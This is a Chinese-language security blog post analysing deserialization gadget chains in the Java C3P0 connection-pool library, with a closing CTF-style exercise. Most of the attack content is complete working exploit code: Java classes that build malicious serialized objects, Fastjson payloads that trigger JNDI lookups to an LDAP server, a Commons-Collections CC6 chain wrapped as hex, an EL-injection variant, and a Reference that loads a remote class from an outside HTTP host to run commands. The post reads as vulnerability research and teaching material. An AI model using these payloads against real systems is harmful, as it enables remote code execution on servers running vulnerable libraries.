# C3P0反序列化漏洞

  
  
&lt;!--more--&gt;  
## 0x01 C3P0组件介绍  
C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。  
JDBC是Java Database Connectivity的缩写，它是Java程序访问数据库的标准接口。  
使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。  
连接池类似于线程池，在一些情况下我们会频繁的操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。  
简单来说，C3P0属于JDBC的一部分和Druid差不多  
## 0x02 C3P0 反序列化漏洞  
pom.xml  
```xml  
&lt;dependency&gt;  
    &lt;groupId&gt;com.mchange&lt;/groupId&gt;  
    &lt;artifactId&gt;c3p0&lt;/artifactId&gt;  
    &lt;version&gt;0.9.5.2&lt;/version&gt;  
&lt;/dependency&gt;  
```  
### C3P0反序列化三条Gadgets  
- URLClassLoader远程类加载  
- JNDI注入  
- 利用HEX序列化字节加载器进行反序列化攻击  
### C3P0之URLClassLoader的链子  
#### 流程分析  
在`ReferenceableUtils`，当中的`referenceToObject()`方法调用了`URLClassLoader`加载类的方法  
最后还有类的加载`instance()`，继续往上找，应该是去找谁调用了`ReferenceableUtils.referenceToObject()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409231850725.png)
`ReferenceIndirector`类的`getObject()`方法调用了`ReferenceUtils.referenceToObject()`，继续往上找  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409231851299.png)
`PoolBackedDataSourceBase#readObject()`调用了`ReferenceSerialized#getObject()`，同时这也正好是一个入口类  
在`readObject()`方法中  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409231854916.png)
反序列化的类必须是`IndirectlySerialized`这个类或者其子类  
那我们如何控制这个类是`IndirectlySerialized`这个类或者其子类呢？  
有`readObject()`肯定有`writeObject()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409231856038.png)
在`writeObject`中会序列化`connectionPoolDataSouce`类，但是由于该接口无法被序列化。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409231857736.png)
所以会进入到`catch`语句中，对`connectionPoolDataSouce`进行了一层`indirectForm`包装  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409231902465.png)
返回了一个`ReferenceSerialized`类，正好继承了`IndirectlySerialized`类，满足了`readObject()`方法  
而恰好也是需要调用到`ReferenceSerialized`类中的`getObject()`方法，所以直接调用自定义的`writeObject()`方法  
#### EXP编写  
```java  
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;    
    
import java.io.*;    
import java.lang.reflect.Field;    
import javax.naming.NamingException;    
import javax.naming.Reference;    
import javax.naming.Referenceable;    
import javax.sql.ConnectionPoolDataSource;    
import javax.sql.PooledConnection;    
import java.sql.SQLException;    
import java.sql.SQLFeatureNotSupportedException;    
import java.util.logging.Logger;    
    
public class c3p0 {    
    public static class evil implements ConnectionPoolDataSource, Referenceable{    
        @Override    
        public Reference getReference() throws NamingException {    
            return new Reference(&#34;Calc&#34;,&#34;Calc&#34;,&#34;http://127.0.0.1:8088&#34;);    
        }    
    
        @Override    
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {    
            return null;    
        }    
    
        @Override    
        public PooledConnection getPooledConnection() throws SQLException {    
            return null;    
        }    
    
        @Override    
        public PrintWriter getLogWriter() throws SQLException {    
            return null;    
        }    
    
        @Override    
        public void setLogWriter(PrintWriter out) throws SQLException {    
    
        }    
    
        @Override    
        public void setLoginTimeout(int seconds) throws SQLException {    
    
        }    
    
        @Override    
        public int getLoginTimeout() throws SQLException {    
            return 0;    
        }    
    
        @Override    
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {    
            return null;    
        }    
    }    
    public static void main(String[] args) throws Exception{    
        PoolBackedDataSourceBase pds = new PoolBackedDataSourceBase(false);    
        Class cl = Class.forName(&#34;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&#34;);    
        Field connectionPoolDataSourceField = cl.getDeclaredField(&#34;connectionPoolDataSource&#34;);    
        connectionPoolDataSourceField.setAccessible(true);    
        connectionPoolDataSourceField.set(pds, new evil());    
    
        //ByteArrayOutputStream baos = new ByteArrayOutputStream();    
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&#34;./src/main/resources/calc.obj&#34;));    
        oos.writeObject(pds);    
    
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&#34;./src/main/resources/calc.obj&#34;));    
        ois.readObject();    
    
    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409231934667.png)
### C3P0之JNDI注入  
#### 流程分析  
基于FastJson的一条链子  
全局搜索一下jndi  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409231958481.png)
在`dereference()`方法中存在`ctx.lookup()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409231957046.png)
这里的`lookup()`的变量是`jndiName`，跟进去看一下`jndiName`是什么  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409232001614.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409232001731.png)
判断了一下`jndiName`是什么`Name`类型，如果是就返回，不是就返回`String`类型  
查找一下哪里用了`dereference()`函数  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409232003045.png)
在`inner()`方法中利用了，继续查找  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409232004062.png)
有很多`getter/setter`方法利用了`inner()`函数，恰好满足了`fastjson`的利用要求  
#### EXP编写  
引入`fastjson`，构造`exp`  
```xml  
&lt;dependency&gt;    
    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    
    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;    
    &lt;version&gt;1.2.24&lt;/version&gt;    
]]&lt;/dependency&gt;  
```  
```java  
import com.alibaba.fastjson.JSON;    
    
// JndiRefForwardingDataSource 类的直接 EXP 调用    
public class JndiFastjson {    
    public static void main(String[] args) {    
        String payload = &#34;{\&#34;@type\&#34;:\&#34;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&#34;,&#34; &#43;    
                &#34;\&#34;jndiName\&#34;:\&#34;ldap://127.0.0.1:1389/5fwc3t\&#34;,\&#34;LoginTimeout\&#34;:\&#34;1\&#34;}&#34;;    
        JSON.parse(payload);    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409232017496.png)
### C3P0之hexbase攻击利用  
#### 流程分析  
这条链子能够成立的根本原因是，有一个`WarpperConnectionPoolDataSouce`类，它能够反序列化一串十六进制字符串  
链子首部是在`WarpperConnectionPoolDataSouce`类的构造函数中，如图  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409232029778.png)
在给`userOverrides`赋值的时候，用的是`C3P0ImplUtils.parseUserOverridesAsString()`方法，这个方法的作用就是反序列化`userOverride`把它这个String类型的东西转换为对象  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409232031205.png)
它这里把hex字符串读了进来，把转码后的结果保存到了`serBytes`这个字节流的数组中，这个字节流是拿去进行`SerializableUtils.formByteArray()`的操作，值得注意的是，在解析过程中调用了`substring()`方法将字符串头部的`HASH_HEADER`截去了，因此我们在构造时需要在十六进制字符串头部加上`HASH_HEADER`，并且会截去字符串最后一位，所以需要在末尾加上一个`;`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409232034618.png)
`SerializableUtils#fromByteArray()`调用了`SerializableUtils#deserializeFromByteArray`，跟进，看到了反序列化的操作`readObject()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409232035426.png)
#### EXP编写  
在链子的第一步看到传入的是`this.getUserOvveridesAsString()`，所以用FastJson去打  
直接用之前的CC6链即可  
引入commons-collections  
```xml  
&lt;dependency&gt;    
 &lt;groupId&gt;commons-collections&lt;/groupId&gt;    
 &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;    
 &lt;version&gt;3.2.1&lt;/version&gt;    
&lt;/dependency&gt;  
```  
```java  
import com.alibaba.fastjson.JSON;    
import org.apache.commons.collections.Transformer;    
import org.apache.commons.collections.functors.ChainedTransformer;    
import org.apache.commons.collections.functors.ConstantTransformer;    
import org.apache.commons.collections.functors.InvokerTransformer;    
import org.apache.commons.collections.keyvalue.TiedMapEntry;    
import org.apache.commons.collections.map.LazyMap;    
    
import java.beans.PropertyVetoException;    
import java.io.ByteArrayOutputStream;    
import java.io.IOException;    
import java.io.ObjectOutputStream;    
import java.io.StringWriter;    
import java.lang.reflect.Field;    
import java.util.HashMap;    
import java.util.Map;    
    
public class HexBaseExp {    
    //CC6的利用链    
    public static Map CC6() throws NoSuchFieldException, IllegalAccessException {    
        //使用InvokeTransformer包装一下    
        Transformer[] transformers = new Transformer[]{    
                new ConstantTransformer(Runtime.class),    
                new InvokerTransformer(&#34;getMethod&#34;, new Class[]{String.class, Class[].class}, new Object[]{&#34;getRuntime&#34;, null}),    
                new InvokerTransformer(&#34;invoke&#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),    
                new InvokerTransformer(&#34;exec&#34;, new Class[]{String.class}, new Object[]{&#34;open -a Calculator&#34;})    
        };    
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);    
        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();    
        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(&#34;five&#34;)); // 防止在反序列化前弹计算器    
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &#34;key&#34;);    
        HashMap&lt;Object, Object&gt; expMap = new HashMap&lt;&gt;();    
        expMap.put(tiedMapEntry, &#34;value&#34;);    
        lazyMap.remove(&#34;key&#34;);    
    
        // 在 put 之后通过反射修改值    
        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;    
        Field factoryField = lazyMapClass.getDeclaredField(&#34;factory&#34;);    
        factoryField.setAccessible(true);    
        factoryField.set(lazyMap, chainedTransformer);    
    
        return expMap;    
    }    
    
    
    static void addHexAscii(byte b, StringWriter sw)    
    {    
        int ub = b &amp; 0xff;    
        int h1 = ub / 16;    
        int h2 = ub % 16;    
        sw.write(toHexDigit(h1));    
        sw.write(toHexDigit(h2));    
    }    
    
    private static char toHexDigit(int h)    
    {    
        char out;    
        if (h &lt;= 9) out = (char) (h &#43; 0x30);    
        else out = (char) (h &#43; 0x37);    
        //System.err.println(h &#43; &#34;: &#34; &#43; out);    
        return out;    
    }    
    
    //将类序列化为字节数组    
    public static byte[] tobyteArray(Object o) throws IOException {    
        ByteArrayOutputStream bao = new ByteArrayOutputStream();    
        ObjectOutputStream oos = new ObjectOutputStream(bao);    
        oos.writeObject(o);    
        return bao.toByteArray();    
    }    
    
    //字节数组转十六进制    
    public static String toHexAscii(byte[] bytes)    
    {    
        int len = bytes.length;    
        StringWriter sw = new StringWriter(len * 2);    
        for (int i = 0; i &lt; len; &#43;&#43;i)    
            addHexAscii(bytes[i], sw);    
        return sw.toString();    
    }    
    
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException {    
        String hex = toHexAscii(tobyteArray(CC6()));    
        System.out.println(hex);    
    
        //Fastjson&lt;1.2.47    
        String payload = &#34;{&#34; &#43;    
                &#34;\&#34;1\&#34;:{&#34; &#43;    
                &#34;\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,&#34; &#43;    
                &#34;\&#34;val\&#34;:\&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&#34;&#34; &#43;    
                &#34;},&#34; &#43;    
                &#34;\&#34;2\&#34;:{&#34; &#43;    
                &#34;\&#34;@type\&#34;:\&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&#34;,&#34; &#43;    
                &#34;\&#34;userOverridesAsString\&#34;:\&#34;HexAsciiSerializedMap:&#34;&#43; hex &#43; &#34;;\&#34;,&#34; &#43;    
                &#34;}&#34; &#43;    
                &#34;}&#34;;    
        JSON.parse(payload);    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409232046066.png)
这里利用FastJson构造了两次  
在给`UserOverridesAsString`赋值的时候做了一次判断  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409232048029.png)
所以在第二次赋值的时候才能真正赋值上去。  
## C3P0链子的不出网利用  
在JNDI高版本利用中，可以加载本地的`Factory`类进行攻击，而利用条件之一就是该工厂类至少存在一个`getObjectInstance()`方法。比如通过加载`Tomcat8`中的`org.apache.naming.factory.BeanFactory`进行EL表达式注入  
导入依赖  
```xml  
&lt;dependency&gt;    
    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;    
    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;    
    &lt;version&gt;8.5.0&lt;/version&gt;    
&lt;/dependency&gt;    
&lt;dependency&gt;    
    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;    
    &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;    
    &lt;version&gt;8.5.15&lt;/version&gt;    
&lt;/dependency&gt;  
```  
### C3P0链子的不出网利用分析与EXP  
已经确定是想通过EL表达式注入的方式攻击了，我们需要先选择攻击的链子。  
选择URLClassLoader的链子，把之前URLClassLoader的EXP进行一些修改即可  
```java  
 public Reference getReference() throws NamingException {      
            ResourceRef resourceRef = new ResourceRef(&#34;javax.el.ELProcessor&#34;, (String)null, &#34;&#34;, &#34;&#34;, true, &#34;org.apache.naming.factory.BeanFactory&#34;, (String)null);      
            resourceRef.add(new StringRefAddr(&#34;forceString&#34;, &#34;faster=eval&#34;));      
            resourceRef.add(new StringRefAddr(&#34;faster&#34;, &#34;Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;)&#34;));      
            return resourceRef;      
        }  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409232324999.png)
## 例题  
存在反序列化漏洞，但是禁止使用ldap  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409232344646.png)
看一下lib  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409250042521.png)
存在C3P0直接打  
构造exp  
```java  
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;    
import java.io.*;    
import java.lang.reflect.Field;    
import javax.naming.NamingException;    
import javax.naming.Reference;    
import javax.naming.Referenceable;    
import javax.sql.ConnectionPoolDataSource;    
import javax.sql.PooledConnection;    
import java.sql.SQLException;    
import java.sql.SQLFeatureNotSupportedException;    
import java.util.Base64;    
import java.util.logging.Logger;    
    
public class c3p0 {    
    public static class evil implements ConnectionPoolDataSource, Referenceable{    
        @Override    
        public Reference getReference() throws NamingException {    
            return new Reference(&#34;Calc&#34;,&#34;Calc&#34;,&#34;http://10.216.7.79:8088/&#34;);    
        }    
    
        @Override    
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {    
            return null;    
        }    
    
        @Override    
        public PooledConnection getPooledConnection() throws SQLException {    
            return null;    
        }    
    
        @Override    
        public PrintWriter getLogWriter() throws SQLException {    
            return null;    
        }    
    
        @Override    
        public void setLogWriter(PrintWriter out) throws SQLException {    
    
        }    
    
        @Override    
        public void setLoginTimeout(int seconds) throws SQLException {    
    
        }    
    
        @Override    
        public int getLoginTimeout() throws SQLException {    
            return 0;    
        }    
    
        @Override    
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {    
            return null;    
        }    
    }    
    public static void main(String[] args) throws Exception{    
        PoolBackedDataSourceBase pds = new PoolBackedDataSourceBase(false);    
        Class cl = Class.forName(&#34;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&#34;);    
        Field connectionPoolDataSourceField = cl.getDeclaredField(&#34;connectionPoolDataSource&#34;);    
        connectionPoolDataSourceField.setAccessible(true);    
        connectionPoolDataSourceField.set(pds, new evil());    
    
        ByteArrayOutputStream baos = new ByteArrayOutputStream();    
        ObjectOutputStream oos = new ObjectOutputStream(baos);    
        oos.writeObject(pds);    
        Base64.Encoder encoder = Base64.getEncoder();    
        System.out.println(encoder.encodeToString(baos.toByteArray()));    
    
    }    
}  
```  
Calc.java  
```java  
public class Calc {    
    public Calc() throws Exception{    
        Runtime.getRuntime().exec(&#34;touch /tmp/success&#34;);    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409250044077.png)

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/c3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/  

